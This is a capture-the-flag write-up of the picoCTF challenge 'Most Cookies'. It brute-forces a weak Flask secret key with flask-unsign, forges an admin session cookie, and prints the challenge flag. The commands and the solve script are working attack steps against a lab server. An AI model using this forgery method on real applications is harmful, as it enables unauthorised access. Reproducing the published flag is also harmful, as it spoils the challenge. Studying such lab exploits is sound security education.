### most cookies

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

we are given server.py

```py
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```

we can decode the session part of the cookie, 

`base64.urlsafe_b64decode('eyJ2ZXJ5X2F1dGgiOiJpY2Vib3gifQ===')`  giving `b'{"very_auth":"icebox"}'`

now set a payload and encode it `base64.urlsafe_b64encode(b'{"very_auth":"admin"}')` gives `b'eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9'`

ahh... turns out I forgot about the checksum

well we have a list of possible secret keys, so we can just brute-force it

make a wordlist from the cookie names and then

```sh
flask-unsign --unsign --server http://mercury.picoctf.net:44693 --wordlist cookies.txt --no-literal-eval
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YFEcxQ.gM07uVLeylxxLqdwD2z57hcn4Fw
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
b'spritz'
```

no we can bake our own cookie

```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret spritz                                   
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YFEc9Q.CYPtnDd-rnYvl3cks_kXZFt7-yY
```

and request to get the flag

```py
#! /usr/bin/env python3

import requests

r= requests.get(
    "http://mercury.picoctf.net:44693/display", 
    cookies= {"PHPSESSID": "j51jtluj8o6vr0c07njqt4umht",  "session": "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YFEc9Q.CYPtnDd-rnYvl3cks_kXZFt7-yY"}
)

print(r.text)
```

running solve.py...

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```


picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}